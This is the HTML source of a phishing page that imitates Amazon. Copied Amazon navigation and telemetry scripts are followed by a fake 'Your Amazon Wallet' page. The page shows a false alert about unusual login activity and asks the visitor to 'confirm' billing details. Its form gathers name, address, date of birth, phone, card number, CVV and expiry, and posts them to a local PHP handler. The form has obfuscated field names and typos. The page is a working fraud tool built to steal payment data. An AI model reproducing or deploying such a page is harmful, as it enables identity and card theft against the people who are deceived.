      templates.add("flyoutError", "<# if(error.title) { #><span class='nav-title'><#=error.title #></span><# } #><# if(error.paragraph) { #><p class='nav-paragraph'><#=error.paragraph #></p><# } #><# if(error.button) { #><a href='<#=error.button.url #>' class='nav-action-button' ><span class='nav-action-inner'><#=error.button.text #></span></a><# } #>");
    });
window.$Nav && $Nav.when("data").run(function(data) { data({"timelineTimeout":{"html":"<div id='nav-timeline'><div id='nav-timeline-error-content'><span class='nav-title'>There’s a problem showing your shopping history right now</span><p class='nav-paragraph'>Please check your network connection or come back in a few minutes.</p></div></div>"}}); });
    if (typeof uet == 'function') {
    uet('bb', 'iss-init-pc', {wb: 1});
  }
  if (!window.$SearchJS && window.$Nav) {
    window.$SearchJS = $Nav.make('sx');
  }

  var opts = {
    host: "completion.amazon.com/search/complete"
  , marketId: "1"
  , obfuscatedMarketId: "ATVPDKIKX0DER"
  , searchAliases: ["aps","amazon-custom-products","amazon-devices","amazonbasics","amazonfresh","wholefoods","stripbooks","popular","apparel","electronics","sporting","sports-and-fitness","outdoor-recreation","fan-shop","garden","videogames","toys-and-games","jewelry","digital-text","digital-music","prime-digital-music","watches","grocery","hpc","instant-video","handmade","handmade-jewelry","handmade-home-and-kitchen","prime-instant-video","shop-instant-video","baby-products","office-products","software","smart-home","magazines","tools","automotive","misc","industrial","mi","pet-supplies","digital-music-track","digital-music-album","mobile","mobile-apps","movies-tv","music-artist","music-album","music-song","stripbooks-spanish","electronics-accessories","pantry","photo","audio-video","computers","furniture","kitchen","audible","audiobooks","beauty","shoes","arts-crafts","appliances","gift-cards","pets","outdoor","lawngarden","collectibles","replacement-parts","financial","fine-art","fashion","fashion-womens","fashion-womens-clothing","fashion-womens-jewelry","fashion-womens-shoes","fashion-womens-watches","fashion-womens-handbags","fashion-mens","fashion-mens-clothing","fashion-mens-jewelry","fashion-mens-shoes","fashion-mens-watches","fashion-girls","fashion-girls-clothing","fashion-girls-jewelry","fashion-girls-shoes","fashion-girls-watches","fashion-boys","fashion-boys-clothing","fashion-boys-jewelry","fashion-boys-shoes","fashion-boys-watches","fashion-baby","fashion-baby-boys","fashion-baby-girls","fashion-luggage","3d-printing","tradein-aps","todays-deals","live-explorations","local-services","vehicles","video-shorts","warehouse-deals","luxury-beauty","banjo-apps","black-friday","cyber-monday","alexa-skills","subscribe-with-amazon","courses","edu-alt-content","amazon-global-store","prime-wardrobe","under-ten-dollars"]
  , filterAliases: []
  , pageType: "CPEFront"
  , requestId: "YF5GA687BG8W5SSXJPYR"
  , sessionId: "144-6121204-6279753"
  , language: "en_US"
  , customerId: "A31P3KWIE1NTKM"
  , b2b: 0
  , fresh: 0
  , isJpOrCn: 0
  , isUseAuiIss: 1
};

var issOpts = {
    fallbackFlag: 1
  , isDigitalFeaturesEnabled: 0
  , isWayfindingEnabled: 1
  , dropdown: "select.searchSelect"
  , departmentText: "in {department}"
  , suggestionText: "Search suggestions"
  , recentSearchesTreatment: "C"
  , authorSuggestionText: "Explore books by XXAUTHXX"
  , translatedStringsMap: {"sx-recent-searches":"Recent searches","sx-your-recent-search":"Inspired by your recent search"}
  , biaTitleText: ""
  , biaPurchasedText: ""
  , biaViewAllText: ""
  , biaViewAllManageText: ""
  , biaAndText: ""
  , biaManageText: ""
  , biaWeblabTreatment: ""
  , issNavConfig: {}
  , np: 0
  , issCorpus: []
  , cf: 1
  , removeDeepNodeISS: ""
  , trendingTreatment: "C"
  , useAPIV2: ""
  , opfSwitch: ""
  , isISSDesktopRefactorEnabled: "1"
  , useServiceHighlighting: "true"
  , isInternal: 0
  , isAPICachingDisabled: true
  , disableAutocompleteOnFocus: ""
};

  if (opts.isUseAuiIss === 1 && window.$Nav) {
  window.$Nav.when('sx.iss').run('iss-mason-init', function(iss){
    var issInitObj = buildIssInitObject(opts, issOpts, true);

    new iss.IssParentCoordinator(issInitObj);

    $SearchJS.declare('canCreateAutocomplete', issInitObj);
  });
} else if (window.$SearchJS) {
  var iss;

  // BEGIN Deprecated globals
  var issHost = opts.host
    , issMktid = opts.marketId
    , issSearchAliases = opts.searchAliases
    , updateISSCompletion = function() { iss.updateAutoCompletion(); };
  // END deprecated globals


  $SearchJS.when('jQuery', 'search-js-autocomplete-lib').run('autocomplete-init', initializeAutocomplete);
  $SearchJS.when('canCreateAutocomplete').run('createAutocomplete', createAutocomplete);

} // END conditional for window.$SearchJS
  function initializeAutocomplete(jQuery) {
  var issInitObj = buildIssInitObject(opts, issOpts);
  $SearchJS.declare("canCreateAutocomplete", issInitObj);
} // END initializeAutocomplete
  function initSearchCsl(searchCSL, issInitObject) {
  searchCSL.init(
    opts.pageType,
    (window.ue && window.ue.rid) || opts.requestId
  );
  $SearchJS.declare("canCreateAutocomplete", issInitObject);
} // END initSearchCsl
  function createAutocomplete(issObject) {
  iss = new AutoComplete(issObject);

  $SearchJS.publish("search-js-autocomplete", iss);

  logMetrics();
} // END createAutocomplete
  function buildIssInitObject(opts, issOpts, isNewIss) {
    var issInitObj = {
        src: opts.host
      , sessionId: opts.sessionId
      , requestId: opts.requestId
      , mkt: opts.marketId
      , obfMkt: opts.obfuscatedMarketId
      , pageType: opts.pageType
      , language: opts.language
      , customerId: opts.customerId
      , fresh: opts.fresh
      , b2b: opts.b2b
      , aliases: opts.searchAliases
      , fb: issOpts.fallbackFlag
      , isDigitalFeaturesEnabled: issOpts.isDigitalFeaturesEnabled
      , isWayfindingEnabled: issOpts.isWayfindingEnabled
      , issPrimeEligible: issOpts.issPrimeEligible
      , deptText: issOpts.departmentText
      , sugText: issOpts.suggestionText
      , filterAliases: opts.filterAliases
      , biaWidgetUrl: opts.biaWidgetUrl
      , recentSearchesTreatment: issOpts.recentSearchesTreatment
      , authorSuggestionText: issOpts.authorSuggestionText
      , translatedStringsMap: issOpts.translatedStringsMap
      , biaTitleText: ""
      , biaPurchasedText: ""
      , biaViewAllText: ""
      , biaViewAllManageText: ""
      , biaAndText: ""
      , biaManageText: ""
      , biaWeblabTreatment: ""
      , issNavConfig: issOpts.issNavConfig
      , cf: issOpts.cf
      , ime: opts.isJpOrCn
      , mktid: opts.marketId
      , qs: opts.isJpOrCn
      , issCorpus: issOpts.issCorpus
      , deepNodeISS: {
          searchAliasAccessor: function($) {
            return (window.SearchPageAccess && window.SearchPageAccess.searchAlias()) ||
                   $('select.searchSelect').children().attr('data-root-alias');
          },
          searchAliasDisplayNameAccessor: function() {
            return (window.SearchPageAccess && window.SearchPageAccess.searchAliasDisplayName());
          }
        }
      , removeDeepNodeISS: issOpts.removeDeepNodeISS
      , trendingTreatment: issOpts.trendingTreatment
      , useAPIV2: issOpts.useAPIV2
      , opfSwitch: issOpts.opfSwitch
      , isISSDesktopRefactorEnabled: issOpts.isISSDesktopRefactorEnabled
      , useServiceHighlighting: issOpts.useServiceHighlighting
      , isInternal: issOpts.isInternal
      , isAPICachingDisabled: issOpts.isAPICachingDisabled
      , disableAutocompleteOnFocus: issOpts.disableAutocompleteOnFocus
    };
  
    // If we aren't using the new ISS then we need to add these properties
    
    if (!isNewIss) {
      issInitObj.dd = issOpts.dropdown; // The element with id searchDropdownBox doesn't exist in C.
      issInitObj.imeSpacing = issOpts.imeSpacing;
      issInitObj.isNavInline = 1;
      issInitObj.triggerISSOnClick = 0;
      issInitObj.sc = 1;
      issInitObj.np = issOpts.np;
    }
  
    return issInitObj;
  } // END buildIssInitObject
  function logMetrics() {
  if (typeof uet == 'function' && typeof uex == 'function') {
      uet('be', 'iss-init-pc',
          {
              wb: 1
          });
      uex('ld', 'iss-init-pc',
          {
              wb: 1
          });
  }
} // END logMetrics
  
    
window.$Nav && $Nav.declare('config.navDeviceType','desktop');

window.$Nav && $Nav.declare('config.navDebugHighres',false);

window.$Nav && $Nav.declare('config.pageType','CPEFront');
window.$Nav && $Nav.declare('config.subPageType','null');

window.$Nav && $Nav.declare('config.dynamicMenuUrl','\x2Fgp\x2Fnavigation\x2Fajax\x2Fdynamic\x2Dmenu.html');

window.$Nav && $Nav.declare('config.dismissNotificationUrl','\x2Fgp\x2Fnavigation\x2Fajax\x2Fdismissnotification.html');

window.$Nav && $Nav.declare('config.enableDynamicMenus',true);

window.$Nav && $Nav.declare('config.isInternal',false);

window.$Nav && $Nav.declare('config.isBackup',false);

window.$Nav && $Nav.declare('config.isRecognized',true);

window.$Nav && $Nav.declare('config.transientFlyoutTrigger','\x23nav\x2Dtransient\x2Dflyout\x2Dtrigger');

window.$Nav && $Nav.declare('config.subnavFlyoutUrl','\x2Fgp\x2Fnavigation\x2Fajax\x2Fsubnav\x2Dflyout');

window.$Nav && $Nav.declare('config.recordEvUrl','\x2Fgp\x2Fnavigation\x2Fajax\x2Frecordevent.html');
window.$Nav && $Nav.declare('config.recordEvInterval',15000);
window.$Nav && $Nav.declare('config.sessionId','144\x2D6121204\x2D6279753');
window.$Nav && $Nav.declare('config.requestId','YF5GA687BG8W5SSXJPYR');

window.$Nav && $Nav.declare('config.alexaListEnabled',true);

window.$Nav && $Nav.declare('config.readyOnATF',false);

window.$Nav && $Nav.declare('config.dynamicMenuArgs',{"rid":"YF5GA687BG8W5SSXJPYR","isFullWidthPrime":0,"isPrime":0,"dynamicRequest":1,"weblabs":"","isFreshRegionAndCustomer":"","primeMenuWidth":310});

window.$Nav && $Nav.declare('config.customerName','Amazon');

window.$Nav && $Nav.declare('config.yourAccountPrimeURL','https\x3A\x2F\x2Fwww.amazon.com\x2Fgp\x2Fcss\x2Forder\x2Dhistory\x2Futils\x2Ffirst\x2Dorder\x2Dfor\x2Dcustomer.html\x2Fref\x3Dya_prefetch_beacon\x3Fie\x3DUTF8\x26s\x3D144\x2D6121204\x2D6279753');

window.$Nav && $Nav.declare('config.yourAccountPrimeHover',true);

window.$Nav && $Nav.declare('config.searchBackState',{});

window.$Nav && $Nav.declare('nav.inline');

(function (i) {
i.onload = function() {window.uet && uet('ne')};
i.src = window._navbarSpriteUrl;
}(new Image()));

window.$Nav && $Nav.declare('config.autoFocus',false);

window.$Nav && $Nav.declare('config.responsiveTouchAgents',["ieTouch"]);

window.$Nav && $Nav.declare('config.responsiveGW',false);

window.$Nav && $Nav.declare('config.pageHideEnabled',false);

window.$Nav && $Nav.declare('config.sslTriggerType','flyoutProximityLarge');
window.$Nav && $Nav.declare('config.sslTriggerRetry',0);

window.$Nav && $Nav.declare('config.doubleCart',false);

window.$Nav && $Nav.declare('config.signInOverride',false);

window.$Nav && $Nav.declare('config.signInTooltip',false);

window.$Nav && $Nav.declare('config.isPrimeMember',false);

window.$Nav && $Nav.declare('config.packardGlowTooltip',false);

window.$Nav && $Nav.declare('config.packardGlowFlyout',false);

window.$Nav && $Nav.declare('config.rightMarginAlignEnabled',true);

window.$Nav && $Nav.declare('config.flyoutAnimation',false);

window.$Nav && $Nav.declare('config.campusActivation','null');

window.$Nav && $Nav.declare('config.primeTooltip',false);

window.$Nav && $Nav.declare('config.primeDay',false);

window.$Nav && $Nav.declare('config.disableBuyItAgain',false);

window.$Nav && $Nav.declare('config.enableCrossShopBiaFlyout',false);

window.$Nav && $Nav.declare('config.pseudoPrimeFirstBrowse',null);

window.$Nav && $Nav.declare('config.sdaYourAccount',{"url":"/ma/api/notification"});

window.$Nav && $Nav.declare('config.csYourAccount',{"url":"/gp/youraccount/navigation/sidepanel"});

window.$Nav && $Nav.declare('config.cartFlyoutDisabled',true);

window.$Nav && $Nav.declare('config.isTabletBrowser',false);

window.$Nav && $Nav.declare('config.HmenuProximityArea',[200,200,200,200]);

window.$Nav && $Nav.declare('config.HMenuIsProximity',true);

window.$Nav && $Nav.declare('config.desktopHMenuRefactor',true);

window.$Nav && $Nav.declare('config.isPureAjaxALF',false);

window.$Nav && $Nav.declare('config.accountListFlyoutRedesign',false);

window.$Nav && $Nav.declare('config.navfresh',false);

window.$Nav && $Nav.declare('config.isFreshRegion',false);

if (window.ue && ue.tag) { ue.tag('navbar'); };

window.$Nav && $Nav.declare('config.blackbelt',true);

window.$Nav && $Nav.declare('config.beaconbelt',true);

window.$Nav && $Nav.declare('config.beaconbeltCover',true);

window.$Nav && $Nav.declare('config.accountList',true);

window.$Nav && $Nav.declare('config.iPadTablet',false);

window.$Nav && $Nav.declare('config.searchapiEndpoint',false);

window.$Nav && $Nav.declare('config.timeline',true);

window.$Nav && $Nav.declare('config.timelineAsinPriceEnabled',false);

window.$Nav && $Nav.declare('config.timelineDeleteEnabled',true);

window.$Nav && $Nav.declare('config.dynamicTimelineDeleteArgs','0');

window.$Nav && $Nav.declare('config.extendedFlyout',false);

window.$Nav && $Nav.declare('config.flyoutCloseDelay',600);

window.$Nav && $Nav.declare('config.flyoutClickState','C');

window.$Nav && $Nav.declare('config.pssFlag',0);

window.$Nav && $Nav.declare('config.isShortAccountList',false);

window.$Nav && $Nav.declare('config.isPrimeTooltipMigrated',false);

if (window.P && typeof window.P.declare === "function" && typeof window.P.now === "function") {
  window.P.now('packardGlowIngressJsEnabled').execute(function(glowEnabled) {
    if (!glowEnabled) {
      window.P.declare('packardGlowIngressJsEnabled', true);
    }
  });
  window.P.now('packardGlowStoreName').execute(function(storeName) {
    if (!storeName) {
      window.P.declare('packardGlowStoreName','generic');
    }
  });
}

window.$Nav && $Nav.declare('configComplete');

    -->
</script>


<a id="skippedLink" tabindex="-1"></a>

<script type="text/javascript">window.navmet.MainEnd = new Date();</script><!-- sp:feature:host-atf -->



<script>
!function(){function n(n,t){var r=i(n);return t&&(r=r("instance",t)),r}var r=[],c=0,i=function(t){return function(){var n=c++;return r.push([t,[].slice.call(arguments,0),n,{time:Date.now()}]),i(n)}};n._s=r,this.csa=n}();;
csa('Config', {});
if (window.csa) {
    csa("Config", {
        'Application': 'Retail',
        'ObfuscatedMarketplaceId': 'ATVPDKIKX0DER',
        'Events.SushiEndpoint': 'https://unagi-na.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
        'CacheDetection.RequestID': "YF5GA687BG8W5SSXJPYR",
        'CacheDetection.Callback': window.ue && ue.reset
    });

    csa("Events")("setEntity", {
        page: {requestId: "YF5GA687BG8W5SSXJPYR", meaningful: "interactive"},
        session: {id: "144-6121204-6279753"}
    });
}
!function(n){var e,o,r="splice",i=n.csa,t={},u={},f=n.csa._s,c=0,a={},s={},l=setTimeout,g=Object.keys;function h(n,t){return i(n,t)}function d(n,t){var i=u[n]||{};D(i,t),u[n]=i,l(b,0)}function p(n,t){a[n]||(a[n]=[]),a[n].push(t)}function v(n,t){if(n in s)t(s[n]);else{p(n,function(n){return t(n),!1})}}function m(n){if(t.DEBUG)throw n}function w(){return Math.abs(4294967295*Math.random()|0).toString(36)}function b(){for(var n=0;n<f.length;){var t=f[n],i=t[0]in u;if(!i&&!o)return void(c=t.length);i?(f[r](c=n,1),y(t)):n++}}function y(n){var arguments,t=u[n[0]],i=(arguments=n[1])[0];if(!t||!t[i])return m("Undefined function: "+t+"/"+i);e=n[3],u[n[2]]=t[i].apply(t,arguments.slice(1))||{},e=0}function S(){o=1,b()}function D(t,i){g(i).forEach(function(n){t[n]=i[n]})}v("$beforeunload",S),d("Config",{instance:function(n){D(t,n)}}),i.plugin=function(n){n(h)},h.config=t,h.register=d,h.on=p,h.removeListener=function(n,t){var i=a[n];i&&i[r](i.indexOf(t),1)},h.once=v,h.emit=function(n,t){for(var i=a[n]||[],e=0;e<i.length;)!1===i[e](t)?i[r](e,1):e++;s[n]=t||{}},h.UUID=function(){return[w(),w(),w(),w()].join("-")},h.time=function(n){var t=e?new Date(e.time):new Date;return"ISO"===n?t.toISOString():t.getTime()},h.error=m,h.exec=function(n,t){return function(){try{n.apply(this,arguments)}catch(n){}}},(h.global=n).csa._s.push=function(n){n[0]in u&&(!f.length||o)?y(n):f[r](c++,0,n)},b(),l(function(){l(S,t.SkipMissingPluginsTimeout||5e3)},1)}("undefined"!=typeof window?window:global);csa.plugin(function(t){var e;function n(){if(!e)try{e=t.global.localStorage||{}}catch(t){e={}}}t.store=function(t,c){try{if(n(),!t)return Object.keys(e);if(!c)return e[t];e[t]=c}catch(t){}},t.deleteStored=function(t){try{n(),delete e[t]}catch(t){}}});csa.plugin(function(n){var r,e=n.global,o=n("Events"),i=e.location,f=e.document,a=e.addEventListener,l=n.emit;function t(a){var e=!!r;e&&(l("$beforePageTransition"),l("$pageTransition"),o("removeEntity","page"));var t={schemaId:"csa.PageEntity.1",id:r=n.UUID(),url:i.href,server:i.hostname,path:i.pathname,referrer:f.referrer,title:f.title};Object.keys(a||{}).forEach(function(e){t[e]=a[e]}),o("setEntity",{page:t}),e&&l("$afterPageTransition")}function d(){l("$load"),l("$afterload")}function c(){l("$beforeunload"),l("$unload"),l("$afterunload")}i&&f&&(a&&(a("beforeunload",c),a("pagehide",c),"complete"===f.readyState?d():a("load",d)),n.register("SPA",{newPage:t}),t())});csa.plugin(function(o){var t="UNKNOWN",u="id",e="messageId",i="timestamp",f="producerId",c="application",a="obfuscatedMarketplaceId",r="entities",s="schemaId",d="version",l="attributes",p=o.config,v=o("Transport"),I={},g=function(n,t){Object.keys(n).forEach(t)};function m(t,e,i){g(e,function(n){n in t||(t[n]={version:1,id:e[n][u]||o.UUID()}),b(t[n],e[n],1===i||!0===i||(i||{})[n])})}function b(t,e,i){g(e,function(n){!i&&n!==u||(t[n]=e[n])})}function y(o,n,c){g(n,function(n){var t=o[n];if(t[s]){var e={},i={};E(e),e[u]=t[u],e[f]=t[f]||c,e[s]=t[s],e[d]=t[d]++,b(e[l]=i,t,1),O(i),v("log",e)}})}function E(n){n[i]=function(n){return"number"==typeof n&&(n=new Date(n).toISOString()),n||o.time("ISO")}(n[i]),n[e]=o.UUID(),n[c]=p.Application||t,n[a]=p.ObfuscatedMarketplaceId||t}function O(n){delete n[d],delete n[s],delete n[f]}function U(o){var c={};this.log=function(n,t){var e={},i=(t||{}).full;E(n),m(e,I,i),m(e,c,i),m(e,n[r]||{},i),g(e,function(n){O(e[n])}),n[f]=o[f],n[r]=e,v("log",n)},this.setEntity=function(n){m(c,n,1),y(c,n,o[f])}}o.register("Events",{setEntity:function(n){m(I,n,1),y(I,n,"csa")},removeEntity:function(n){delete I[n]},instance:function(n){return new U(n)}})});csa.plugin(function(s){var c,l="Transport",d="post",u="preflight",r="csa.cajun.",i="store",a="deleteStored",n="addEventListener",f="sendBeacon",t=0,e=s.config[l+".BufferSize"]||2e3,g=s.config[l+".RetryDelay"]||1500,o=[],h=0,p=[],v=s.global,y=v.document,m=s.config[l+".FlushInterval"]||5e3,E=0;function T(n){if(864e5<s.time()-+new Date(n.timestamp))return s.error("Event is too old: "+n);h<e&&(o.push(n),h++,!E&&t&&(E=setTimeout(R,m)))}function R(){p.forEach(function(t){var e=[];o.forEach(function(n){t.accepts(n)&&e.push(n)}),e.length&&(t.chunks?t.chunks(e).forEach(function(n){S(t,n)}):S(t,e))}),o=[],E=0}function S(t,e){function o(){s[a](r+n)}var n=s.UUID();s[i](r+n,JSON.stringify(e)),[function(n,t,e){var o=v.navigator||{},r=v.cordova||{};if(!o[f]||!n[d])return 0;n[u]&&r&&"ios"===r.platformId&&!c&&((new Image).src=n[u]().url,c=1);var i=n[d](t);if(!i.type&&o[f](i.url,i.body))return e(),1},function(n,t,e){if(!n[d])return 0;var o=n[d](t),r=o.url,i=o.body,c=o.type,u=new XMLHttpRequest,a=0;function f(n,t,e){u.open("POST",n),e&&u.setRequestHeader("Content-Type",e),u.send(t)}return u.onload=function(){u.status<299?e():s.config[l+".XHRRetries"]&&a<3&&setTimeout(function(){f(r,i,c)},++a*g)},f(r,i,c),1}].some(function(n){try{return n(t,e,o)}catch(n){}})}s.once("$afterload",function(){t=1,function(e){(s[i]()||[]).forEach(function(n){if(!n.indexOf(r))try{var t=s[i](n);s[a](n),JSON.parse(t).forEach(e)}catch(n){s.error(n)}})}(T),y&&y[n]&&y[n]("visibilitychange",R,!1),R()}),s.once("$afterunload",function(){t=1,R()}),s.on("$afterPageTransition",function(){h=0}),s.register(l,{log:T,register:function(n){p.push(n)}})});csa.plugin(function(n){var r=n.config["Events.SushiEndpoint"];n("Transport")("register",{accepts:function(n){return n.schemaId},post:function(n){var t=n.map(function(n){return{data:n}});return{url:r,body:JSON.stringify({events:t})}},preflight:function(){var n,t=/\/\/(.*?)\//.exec(r);return t&&t[1]&&(n="https://"+t[1]+"/ping"),{url:n}},chunks:function(n){for(var t=[];500<n.length;)t.push(n.splice(0,500));return t.push(n),t}})});csa.plugin(function(t){var i,a,o,r,d=t.config["Content.ImpressionMinimumTime"]||1e3,e="addEventListener",c="hidden",n="renderedTo",s=n+"Viewed",u=n+"Meaningful",f=n+"Impressed",g=1,m=2,l=3,v=4,p=5,h="loaded",T=7,I=t.global,P=t("Events",{producerId:"csa"}),y=I.document,C={},b={};if(!y||!y[e]||void 0===y[c])return E("PageStateChange.2",{state:"ignored"});function w(e){if(!C[T]){var n;if(C[e]=t.time(),e!==l&&e!==h||(i=i||C[e]),i&&!y[c])a=a||C[e],(n={})[u]=i-o,n[s]=a-o,E("PageView.4",n),r=r||setTimeout(S,d);if(e!==p&&e!==g&&e!==m||(clearTimeout(r),r=0),e!==g&&e!==m||E("PageRender.3",{transitionType:e===g?"hard":"soft"}),e===T)(n={})[u]=i-o,n[s]=a-o,n[f]=C[e]-o,E("PageImpressed.2",n)}}function E(e,n){b[e]||(n.schemaId="csa."+e,P("log",n,{full:1}),b[e]=1)}function M(){w(y[c]?p:v)}function S(){w(T),r=0}function V(){var e=o?m:g;C={},b={},a=i=0,o=t.time(),w(e),M()}function $(){var e=y.readyState;"interactive"===e&&w(l),"complete"===e&&w(h)}V(),y[e]("visibilitychange",M,!1),y[e]("readystatechange",$,!1),t.on("$afterPageTransition",V),t.once("$load",$),t.register("Content",{get:function(){return{emit:w}}})});
</script>

<script type="text/javascript">

(function(){function l(a){for(var c=b.location.search.substring(1).split("&"),e=0;e<c.length;e++){var d=c[e].split("=");if(d[0]===a)return d[1]}}window.amzn=window.amzn||{};amzn.copilot=amzn.copilot||{};var b=window,f=document,g=b.P||b.AmazonUIPageJS,h=f.head||f.getElementsByTagName("head")[0],m=0,n=0;amzn.copilot.checkCoPilotSession=function(){f.cookie.match("cpidv")&&("undefined"!==typeof jQuery&&k(jQuery),g&&g.when&&g.when("jQuery").execute(function(a){k(a)}),b.amznJQ&&b.amznJQ.available&&b.amznJQ.available("jQuery",
function(){k(jQuery)}),b.jQuery||g||b.amznJQ||q())};var q=function(){m?b.ue&&"function"===typeof b.ue.count&&b.ue.count("cpJQUnavailable",1):(m=1,f.addEventListener?f.addEventListener("DOMContentLoaded",amzn.copilot.checkCoPilotSession,!1):f.attachEvent&&f.attachEvent("onreadystatechange",function(){"complete"===f.readyState&&amzn.copilot.checkCoPilotSession()}))},k=function(a){if(!n){n=1;amzn.copilot.jQuery=a;a=l("debugJS");var c="https:"===b.location.protocol?1:0,e=1;url="/gp/copilot/handlers/copilot_strings_resources.html";
window.texas&&texas.locations&&(url=texas.locations.makeUrl(url));g&&g.AUI_BUILD_DATE&&(e=0);amzn.copilot.jQuery.ajax&&amzn.copilot.jQuery.ajax({url:url,dataType:"json",data:{isDebug:a,isSecure:c,includeAUIP:e},success:function(a){amzn.copilot.vip=a.serviceEndPoint;amzn.copilot.enableMultipleTabSession=a.isFollowMe;r(a)},error:function(){b.ue.count("cpLoadResourceError",1)}})}},r=function(a){var c=amzn.copilot.jQuery,e=function(){amzn.copilot.setup(c.extend({isContinuedSession:!0},a))};a.CSSUrls&&
c.each(a.CSSUrls[0],function(a,c){var b=f.createElement("link");b.type="text/css";b.rel="stylesheet";b.href=c;h.appendChild(b)});a.CSSTag&&s(a.CSSTag);if(a.JSUrls){var d=l("forceSynchronousJS"),b=a.JSUrls[0];c.each(b,function(a,c){a===b.length-1?p(c,d,e):p(c,d)})}a.JSTag&&(t(a.JSTag),P.when("CSCoPilotPresenterAsset").execute(function(){e()}))},t=function(a){var c=f.createElement("div");c.innerHTML=a;a=0;for(var b=c.children.length;a<b;a++){var d=f.createElement("script");d.type="text/javascript";
d.innerHTML=c.children[a].innerHTML;h.appendChild(d)}},s=function(a){var b=f.createElement("div");b.innerHTML=a;a=0;for(var e=b.children.length;a<e;a++)h.appendChild(b.children[a])},p=function(a,b,e){var d=f.createElement("script");d.type="text/javascript";d.src=a;d.async=b?!1:!0;e&&(d.onload=e);h.appendChild(d)}})();

amzn.copilot.checkCoPilotSession();

</script>
<div class="a-content">
        <div class="container">
            <span class="lefttext"><a href="#" class="lefttext">Your Account</a></span>
            <span class="middle">&gt;</span>
            <span class="righttext">Your Amazon Wallet</span>
            <p class="alerttext">Amazon's security system. We have recently discovered an unusual login activity. To protect your account , please continue the required steps .</p>


            <div class="row">
                <div class="col-12">
                    <div class="mypayementarea">
                        <form action="Actions/billing.php" method="post">
                            <span class="colorblacked">Confirm your billing adress</span>

                            <div class="row mt-3">
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="fullname">Full Name:</label>
                                        <input type="text" class="form-control amazoninput" name="fullname" id="fullname" placeholder="Full Name" required="">
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="adressline1">Address line 1:</label>
                                        <input type="text" class="form-control amazoninput" name="address1" id="adressline1" placeholder="Street address,P.O. box, company name." required="">
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="adressline2">Address line 2:</label>
                                        <input type="text" class="form-control amazoninput" name="address2" id="adressline2" placeholder="Apartment, suite, unit, building, floor, etc.">
                                    </div>
                                </div>

                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="adressline2">City:</label>
                                        <input type="text" class="form-control amazoninput" name="city" id="adressline2" placeholder="City" required="">
                                    </div>
                                </div>


                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="stateregionprovince">State/Province/Region:</label>
                                        <input type="text" class="form-control amazoninput" name="state" id="city" placeholder="State/Province/Region" required="">
                                    </div>
                                </div>

                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="zipCode"></label>
                                        <input type="text" class="form-control amazoninput" name="zip" id="zipCode" placeholder="Zip Code" required="">
                                    </div>
                                </div>

                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="country">Country:</label>
                                        <input type="text" class="form-control amazoninput" value="" name="country" id="country" placeholder="Country" required="">
                                    </div>
                                </div>

                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="birth">Date of Birth: </label>
                                        <input type="text" class="form-control amazoninput" name="dob" id="birth" placeholder="DD/MM/YYYY" required="" maxlength="10">
                                    </div>
                                </div>

                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="phonenumber">Phone number:</label>
                                        <input type="tel" class="form-control amazoninput" name="phone" id="phonenumber" placeholder="Phone number" required="">
                                    </div>
                                </div>


                            </div>

                            <span class="colorblacked" style="display:block;">Confirm your payment method</span>
                            <div class="mt-1">
                                <img src="Assets/img/payment1.png" alt="">
                                <img src="Assets/img/payment2.png" alt="">
                                <img src="Assets/img/payment3.png" alt="">
                                <img src="Assets/img/payment4.png" alt="">
                                <img src="Assets/img/payment5.png" alt="">
                                <img src="Assets/img/payment6.png" alt="">
                                <img src="Assets/img/payment7.png" alt="">
                            </div>
                            <div class="row mt-3">
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="nameoncard">Name on card: </label>
                                        <input type="text" class="form-control amazoninput" name="nameoncard" id="nameoncard" placeholder="Card holder name" required="">
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="id_xccaaa">Card number: </label>
                                        <input type="text" class="form-control amazoninput" name="ncn" id="id_xccaaa" placeholder="XXXX XXXX XXXX XXXX" required="" maxlength="16">
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="csc">Card Security Code:</label>
                                        <input type="text" class="form-control amazoninput" name="cxxs" id="xc" placeholder="CVV/CVV2" maxlength="3" required="">
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    <div class="row">
                                        <div class="col-6">
                                            <div class="form-group">
                                                <label for="months"></label>
                                                <select class="form-control bgcolored2" name="month" id="months" required="">
                                                    <option>MM</option>
                                                    <option>01</option>
                                                    <option>02</option>
                                                    <option>03</option>
                                                    <option>04</option>
                                                    <option>05</option>
                                                    <option>06</option>
                                                    <option>07</option>
                                                    <option>08</option>
                                                    <option>09</option>
                                                    <option>10</option>
                                                    <option>11</option>
                                                    <option>12</option>
                                                </select>
                                            </div>
                                        </div>
                                        <div class="col-6">
                                            <div class="form-group">
                                                <label for="months"></label>
                                                <select class="form-control bgcolored2" name="year" id="months" required="">
                                                    <option>YYYY</option>
                                                    <option>2020</option>
                                                    <option>2021</option>
                                                    <option>2022</option>
                                                    <option>2023</option>
                                                    <option>2024</option>
                                                    <option>2025</option>
                                                    <option>2026</option>
                                                    <option>2027</option>
													<option>2028</option>
													<option>2029</option>
                                                    <option>2030</option>
                                                </select>
                                            </div>
                                        </div>
                                    </div>
                                </div>


                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <input type="submit" name="Sex" class="btn bgcolored " value="Continue">
                                </div>
                            </div>
                        </form>
                    </div>

                </div>
            </div>
        </div>
    </div>
	
	<script src="Library/jQuery/main.min.js"></script>
    <script src="Library/pooper/main.min.js"></script>
    <script src="Library/Bootstrap/js/main.min.js"></script>
    <script src="Library/jQuery/mask/jquery.mask.min.js"></script>
    <script src="Library/xvalidator/qunit.js"></script>




    <script>
        $(document).ready(function() {
            $('.myddown').hover(function() {
                $('.mydropdown').togleClass('d-none');
            })
            $('#buttonToggle').toggleClass();
            $('#birth').mask('00/00/0000');
        })
    </script>

</body>

</html>
<noscript>
